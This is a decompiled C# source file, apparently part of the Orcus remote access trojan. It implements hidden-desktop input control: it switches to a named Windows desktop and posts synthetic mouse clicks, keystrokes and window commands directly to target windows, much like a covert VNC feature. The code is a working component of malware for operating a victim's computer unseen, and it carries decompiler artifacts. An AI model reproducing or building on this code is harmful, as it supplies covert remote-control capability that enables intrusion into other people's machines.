using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Commands.RemoteDesktop;

namespace Orcus.Utilities.WindowsDesktop;

public class DesktopActions
{
	[Flags]
	public enum WindowPrintTypes
	{
		WCF_PAINTMETHOD_NOP = 1,
		WCF_PAINTMETHOD_PAINT = 2,
		WCF_PAINTMETHOD_PRINT = 4,
		WCF_PAINTMETHOD_PRINTWINDOW = 8,
		WCF_PAINTMETHOD_SKIP_HOOK = 0x10,
		WCF_MOUSE_CLIENT_TO_SCREEN = 0x20,
		WCF_MOUSE_AUTOCAPTURE = 0x40
	}

	private enum SysCommands
	{
		SC_SIZE = 61440,
		SC_MOVE = 61456,
		SC_MINIMIZE = 61472,
		SC_MAXIMIZE = 61488,
		SC_NEXTWINDOW = 61504,
		SC_PREVWINDOW = 61520,
		SC_CLOSE = 61536,
		SC_VSCROLL = 61552,
		SC_HSCROLL = 61568,
		SC_MOUSEMENU = 61584,
		SC_KEYMENU = 61696,
		SC_ARRANGE = 61712,
		SC_RESTORE = 61728,
		SC_TASKLIST = 61744,
		SC_SCREENSAVE = 61760,
		SC_HOTKEY = 61776,
		SC_DEFAULT = 61792,
		SC_MONITORPOWER = 61808,
		SC_CONTEXTHELP = 61824,
		SC_SEPARATOR = 61455,
		SCF_ISSECURE = 1,
		SC_ICON = 61472,
		SC_ZOOM = 61488
	}

	private enum GetAncestorFlags
	{
		GetParent = 1,
		GetRoot,
		GetRootOwner
	}

	public enum MouseActivate
	{
		MA_ACTIVATE = 1,
		MA_ACTIVATEANDEAT,
		MA_NOACTIVATE,
		MA_NOACTIVATEANDEAT
	}

	[Flags]
	public enum SendMessageTimeoutFlags : uint
	{
		SMTO_NORMAL = 0u,
		SMTO_BLOCK = 1u,
		SMTO_ABORTIFHUNG = 2u,
		SMTO_NOTIMEOUTIFNOTHUNG = 8u,
		SMTO_ERRORONEXIT = 0x20u
	}

	public enum HitTestValues
	{
		HTERROR = -2,
		HTTRANSPARENT = -1,
		HTNOWHERE = 0,
		HTCLIENT = 1,
		HTCAPTION = 2,
		HTSYSMENU = 3,
		HTGROWBOX = 4,
		HTMENU = 5,
		HTHSCROLL = 6,
		HTVSCROLL = 7,
		HTMINBUTTON = 8,
		HTMAXBUTTON = 9,
		HTLEFT = 10,
		HTRIGHT = 11,
		HTTOP = 12,
		HTTOPLEFT = 13,
		HTTOPRIGHT = 14,
		HTBOTTOM = 15,
		HTBOTTOMLEFT = 16,
		HTBOTTOMRIGHT = 17,
		HTBORDER = 18,
		HTOBJECT = 19,
		HTCLOSE = 20,
		HTHELP = 21,
		HTSIZEFIRST = 10,
		HTSIZELAST = 17
	}

	[Flags]
	private enum WindowStyles : uint
	{
		WS_BORDER = 0x800000u,
		WS_CAPTION = 0xC00000u,
		WS_CHILD = 0x40000000u,
		WS_CLIPCHILDREN = 0x2000000u,
		WS_CLIPSIBLINGS = 0x4000000u,
		WS_DISABLED = 0x8000000u,
		WS_DLGFRAME = 0x400000u,
		WS_GROUP = 0x20000u,
		WS_HSCROLL = 0x100000u,
		WS_MAXIMIZE = 0x1000000u,
		WS_MAXIMIZEBOX = 0x10000u,
		WS_MINIMIZE = 0x20000000u,
		WS_MINIMIZEBOX = 0x20000u,
		WS_OVERLAPPED = 0u,
		WS_OVERLAPPEDWINDOW = 0xCF0000u,
		WS_POPUP = 0x80000000u,
		WS_POPUPWINDOW = 0x80880000u,
		WS_SIZEFRAME = 0x40000u,
		WS_SYSMENU = 0x80000u,
		WS_TABSTOP = 0x10000u,
		WS_VISIBLE = 0x10000000u,
		WS_VSCROLL = 0x200000u
	}

	private readonly Desktop _desktop;

	private const uint WM_KEYDOWN = 256u;

	private const uint WM_KEYUP = 257u;

	private const uint WM_LBUTTONDOWN = 513u;

	private const uint WM_LBUTTONUP = 514u;

	private const uint WM_RBUTTONDOWN = 516u;

	private const uint WM_RBUTTONUP = 517u;

	private const int VMW_EXECUTE_MENU = -1;

	private const int VMW_HILITE_MENU = -2;

	private IntPtr _lastWindow;

	private const uint MK_LBUTTON = 1u;

	private const int HWND_TOP = 0;

	private const int HWND_TOPMOST = -1;

	private const uint GW_OWNER = 4u;

	private static readonly Dictionary<string, WindowPrintTypes> _windowPrintTypes = new Dictionary<string, WindowPrintTypes>
	{
		{
			"SysShadow",
			WindowPrintTypes.WCF_PAINTMETHOD_NOP
		},
		{
			"#32768",
			WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN | WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE
		},
		{
			"ConsoleWindowClass",
			WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK
		},
		{
			"CiceroUIWndFrame",
			WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK
		},
		{
			"MDIClient",
			WindowPrintTypes.WCF_PAINTMETHOD_PRINTWINDOW | WindowPrintTypes.WCF_PAINTMETHOD_SKIP_HOOK
		},
		{
			"SysListView32",
			WindowPrintTypes.WCF_PAINTMETHOD_PRINT
		}
	};

	private static readonly int GWL_STYLE = -16;

	public uint VncMessage { get; private set; }

	[DllImport("user32.dll")]
	internal static extern IntPtr WindowFromPoint(Point p);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	internal static extern IntPtr GetParent(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern uint RegisterWindowMessage(string lpString);

	public DesktopActions(Desktop desktop)
	{
		_desktop = desktop;
	}

	public void Load()
	{
		Desktop.SetCurrent(_desktop);
		VncMessage = RegisterWindowMessage(_desktop.DesktopName);
		if (VncMessage == 0)
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);

	private bool StyleHaveSizeBorders(WindowStyles style)
	{
		if ((style & WindowStyles.WS_CAPTION) != WindowStyles.WS_CAPTION)
		{
			return ((uint)style & 0x80040000u) != 0;
		}
		return true;
	}

	public void DoMouseAction(RemoteDesktopMouseAction mouseAction, int x, int y, int extra, long windowHandle)
	{
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0161: Expected I4, but got Unknown
		//IL_0166: Unknown result type (might be due to invalid IL or missing references)
		IntPtr hwnd = (IntPtr)windowHandle;
		WINDOWINFO pwi = new WINDOWINFO(true);
		NativeMethods.GetWindowInfo(hwnd, ref pwi);
		NativeMethods.GetWindowRect(hwnd, out var lpRect);
		int num = lpRect.X + x;
		int num2 = lpRect.Y + y;
		HitTestValues hitTest = HitTestValues.HTNOWHERE;
		IntPtr intPtr = WindowFromPoint(new Point(num, num2), 100u, ref hitTest, IntPtr.Zero);
		if (hitTest >= HitTestValues.HTLEFT && hitTest <= HitTestValues.HTBOTTOMRIGHT)
		{
			WindowStyles windowLong = (WindowStyles)GetWindowLong(intPtr, GWL_STYLE);
			if ((windowLong & WindowStyles.WS_CHILD) == WindowStyles.WS_CHILD && !StyleHaveSizeBorders(windowLong))
			{
				IntPtr parent = GetParent(intPtr);
				if (parent != IntPtr.Zero)
				{
					intPtr = parent;
				}
			}
		}
		if ((GetWindowClassFlags(intPtr) & WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE) != 0)
		{
			hitTest = HitTestValues.HTCLIENT;
		}
		if (intPtr == IntPtr.Zero)
		{
			return;
		}
		WINDOWINFO pwi2 = default(WINDOWINFO);
		pwi2.cbSize = (uint)Marshal.SizeOf((object)pwi2);
		if (NativeMethods.GetWindowInfo(intPtr, ref pwi2))
		{
			IntPtr intPtr2 = MAKELPARAM(num, num2);
			IntPtr clientCursorPos = (((GetWindowClassFlags(intPtr) & WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) != WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) ? MAKELPARAM(num - pwi2.rcClient.Left, num2 - pwi2.rcClient.Top) : intPtr2);
			WM message;
			WM ncMessage;
			switch ((int)mouseAction)
			{
			default:
				throw new ArgumentOutOfRangeException("mouseAction", mouseAction, null);
			case 0:
				message = WM.LBUTTONDOWN;
				ncMessage = WM.NCLBUTTONDOWN;
				break;
			case 1:
				message = WM.LBUTTONUP;
				ncMessage = WM.NCLBUTTONUP;
				break;
			case 2:
				message = WM.RBUTTONDOWN;
				ncMessage = WM.NCRBUTTONDOWN;
				break;
			case 3:
				message = WM.RBUTTONUP;
				ncMessage = WM.NCRBUTTONDOWN;
				break;
			case 4:
				message = WM.MBUTTONDOWN;
				ncMessage = WM.NCMBUTTONDOWN;
				break;
			case 5:
				message = WM.MBUTTONUP;
				ncMessage = WM.NCMBUTTONUP;
				break;
			case 6:
				message = WM.XBUTTONDOWN;
				ncMessage = WM.NCXBUTTONDOWN;
				break;
			case 7:
				message = WM.XBUTTONUP;
				ncMessage = WM.NCXBUTTONUP;
				break;
			case 8:
			case 9:
				return;
			case 10:
				message = WM.MOUSEFIRST;
				ncMessage = WM.NCMOUSEMOVE;
				break;
			case 11:
				return;
			}
			MouseEvent(intPtr, pwi, hitTest, message, ncMessage, clientCursorPos, intPtr2);
		}
	}

	public void DoMouseClick(Point p, RemoteDesktopMouseAction mouseAction)
	{
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Invalid comparison between Unknown and I4
		HitTestValues hitTest = HitTestValues.HTNOWHERE;
		IntPtr intPtr = WindowFromPoint(p, 100u, ref hitTest, IntPtr.Zero);
		if (hitTest >= HitTestValues.HTLEFT && hitTest <= HitTestValues.HTBOTTOMRIGHT)
		{
			WindowStyles windowLong = (WindowStyles)GetWindowLong(intPtr, GWL_STYLE);
			if ((windowLong & WindowStyles.WS_CHILD) == WindowStyles.WS_CHILD && !StyleHaveSizeBorders(windowLong))
			{
				IntPtr parent = GetParent(intPtr);
				if (parent != IntPtr.Zero)
				{
					intPtr = parent;
				}
			}
		}
		if ((GetWindowClassFlags(intPtr) & WindowPrintTypes.WCF_MOUSE_AUTOCAPTURE) != 0)
		{
			hitTest = HitTestValues.HTCLIENT;
		}
		if (intPtr == IntPtr.Zero)
		{
			return;
		}
		WINDOWINFO pwi = default(WINDOWINFO);
		pwi.cbSize = (uint)Marshal.SizeOf((object)pwi);
		if (NativeMethods.GetWindowInfo(intPtr, ref pwi))
		{
			IntPtr intPtr2 = MAKELPARAM(p.X, p.Y);
			IntPtr clientCursorPos = (((GetWindowClassFlags(intPtr) & WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) != WindowPrintTypes.WCF_MOUSE_CLIENT_TO_SCREEN) ? MAKELPARAM(p.X - pwi.rcClient.Left, p.Y - pwi.rcClient.Top) : intPtr2);
			if ((int)mouseAction == 0)
			{
				MouseEvent(intPtr, pwi, hitTest, WM.LBUTTONDOWN, WM.NCLBUTTONDOWN, clientCursorPos, intPtr2);
			}
			if ((int)mouseAction == 1)
			{
				MouseEvent(intPtr, pwi, hitTest, WM.LBUTTONUP, WM.NCLBUTTONUP, clientCursorPos, intPtr2);
			}
		}
	}

	private WindowPrintTypes GetWindowClassFlags(IntPtr window)
	{
		StringBuilder stringBuilder = new StringBuilder(256);
		if (NativeMethods.GetClassName(window, stringBuilder, 256) > 0)
		{
			foreach (KeyValuePair<string, WindowPrintTypes> windowPrintType in _windowPrintTypes)
			{
				if (string.Equals(stringBuilder.ToString(), windowPrintType.Key, StringComparison.OrdinalIgnoreCase))
				{
					return windowPrintType.Value;
				}
			}
		}
		return (WindowPrintTypes)0;
	}

	[DllImport("user32.dll", ExactSpelling = true)]
	private static extern IntPtr GetAncestor(IntPtr hwnd, GetAncestorFlags flags);

	private void MouseEvent(IntPtr window, WINDOWINFO windowinfo, HitTestValues hitTest, WM message, WM ncMessage, IntPtr clientCursorPos, IntPtr screenCursorPos)
	{
		if (message == WM.LBUTTONDOWN || message == WM.MBUTTONDOWN || message == WM.RBUTTONDOWN)
		{
			IntPtr ancestor = GetAncestor(window, GetAncestorFlags.GetRoot);
			if (ancestor != _lastWindow)
			{
				MouseActivate mouseActivate;
				if (SendMessageTimeout(window, 33u, ancestor, MAKELPARAM((int)hitTest, (int)message), SendMessageTimeoutFlags.SMTO_ABORTIFHUNG, 100u, out var result) != IntPtr.Zero && ((mouseActivate = (MouseActivate)(int)result) == MouseActivate.MA_ACTIVATEANDEAT || mouseActivate == MouseActivate.MA_NOACTIVATEANDEAT))
				{
					return;
				}
				NativeMethods.SetWindowPos(ancestor, new IntPtr(-1), 0, 0, 0, 0, SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.ShowWindow);
				_lastWindow = ancestor;
			}
		}
		NativeMethods.PostMessage(new HandleRef(null, window), WM.SETCURSOR, window, MAKELPARAM((int)hitTest, (int)message));
		if (hitTest == HitTestValues.HTCLIENT)
		{
			NativeMethods.PostMessage(new HandleRef(null, window), message, (IntPtr)1L, clientCursorPos);
			return;
		}
		SysCommands sysCommands = (SysCommands)0;
		switch (hitTest)
		{
		case HitTestValues.HTHELP:
			switch (ncMessage)
			{
			case WM.NCLBUTTONUP:
				sysCommands = SysCommands.SC_CONTEXTHELP;
				break;
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		case HitTestValues.HTCLOSE:
			switch (ncMessage)
			{
			case WM.NCLBUTTONUP:
				sysCommands = SysCommands.SC_CLOSE;
				break;
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		case HitTestValues.HTCAPTION:
			switch (ncMessage)
			{
			case WM.NCLBUTTONDBLCLK:
				NativeMethods.PostMessage(new HandleRef(null, window), ncMessage, (IntPtr)(int)hitTest, clientCursorPos);
				break;
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		case HitTestValues.HTSYSMENU:
			switch (ncMessage)
			{
			case WM.NCLBUTTONDBLCLK:
				sysCommands = SysCommands.SC_CLOSE;
				break;
			case WM.NCLBUTTONDOWN:
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		case HitTestValues.HTMENU:
			switch (ncMessage)
			{
			case WM.NCLBUTTONDOWN:
				NativeMethods.PostMessage(new HandleRef(null, window), (WM)VncMessage, (IntPtr)(-1), IntPtr.Zero);
				break;
			case WM.NCMOUSEMOVE:
				NativeMethods.PostMessage(new HandleRef(null, window), (WM)VncMessage, (IntPtr)(-2), IntPtr.Zero);
				break;
			}
			break;
		default:
			NativeMethods.PostMessage(new HandleRef(null, window), message, (IntPtr)1L, clientCursorPos);
			NativeMethods.PostMessage(new HandleRef(null, window), ncMessage, (IntPtr)(int)hitTest, screenCursorPos);
			break;
		case HitTestValues.HTMINBUTTON:
			switch (ncMessage)
			{
			case WM.NCLBUTTONUP:
				if ((windowinfo.dwStyle & 0x20000u) != 0)
				{
					sysCommands = SysCommands.SC_MINIMIZE;
				}
				break;
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		case HitTestValues.HTMAXBUTTON:
			switch (ncMessage)
			{
			case WM.NCLBUTTONUP:
				if ((windowinfo.dwStyle & 0x10000u) != 0)
				{
					sysCommands = (((windowinfo.dwStyle & 0x1000000) == 0) ? SysCommands.SC_MAXIMIZE : SysCommands.SC_RESTORE);
				}
				break;
			case WM.NCRBUTTONUP:
				sysCommands = (SysCommands)65535;
				break;
			}
			break;
		}
		switch (sysCommands)
		{
		case (SysCommands)65535:
			NativeMethods.PostMessage(new HandleRef(null, window), WM.CONTEXTMENU, (IntPtr)(int)sysCommands, clientCursorPos);
			break;
		default:
			NativeMethods.PostMessage(new HandleRef(null, window), WM.SYSCOMMAND, (IntPtr)(int)sysCommands, clientCursorPos);
			break;
		case (SysCommands)0:
			break;
		}
	}

	private IntPtr MAKELPARAM(int p, int p2)
	{
		return (IntPtr)((p2 << 16) | (p & 0xFFFF));
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr SendMessageTimeout(IntPtr windowHandle, uint Msg, IntPtr wParam, IntPtr lParam, SendMessageTimeoutFlags flags, uint timeout, out IntPtr result);

	public void KeyDown(Keys key, bool down)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected I4, but got Unknown
		_desktop.PostMessage(down ? WM.KEYFIRST : WM.KEYUP, (IntPtr)(int)key, IntPtr.Zero);
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern int GetWindowLong(IntPtr hWnd, int nIndex);

	[DllImport("user32.dll")]
	private static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

	private IntPtr WindowFromPoint(Point point, uint timeout, ref HitTestValues hitTest, IntPtr lastestWindowFromPoint)
	{
		IntPtr intPtr = WindowFromPoint(point);
		if (intPtr != IntPtr.Zero)
		{
			if (SendMessageTimeout(intPtr, 132u, IntPtr.Zero, MAKELPARAM(point.X, point.Y), SendMessageTimeoutFlags.SMTO_ABORTIFHUNG, timeout, out var result) == IntPtr.Zero)
			{
				intPtr = IntPtr.Zero;
			}
			else
			{
				HitTestValues hitTestValues = (HitTestValues)(int)result;
				if (hitTestValues == HitTestValues.HTTRANSPARENT)
				{
					if (intPtr == lastestWindowFromPoint)
					{
						return lastestWindowFromPoint;
					}
					IntPtr hWnd = intPtr;
					SetWindowLong(intPtr, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) | 0x8000000);
					intPtr = WindowFromPoint(point, timeout, ref hitTest, intPtr);
					SetWindowLong(intPtr, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) & -134217729);
				}
				else if (hitTest == HitTestValues.HTNOWHERE)
				{
					hitTest = hitTestValues;
				}
			}
		}
		return intPtr;
	}
}
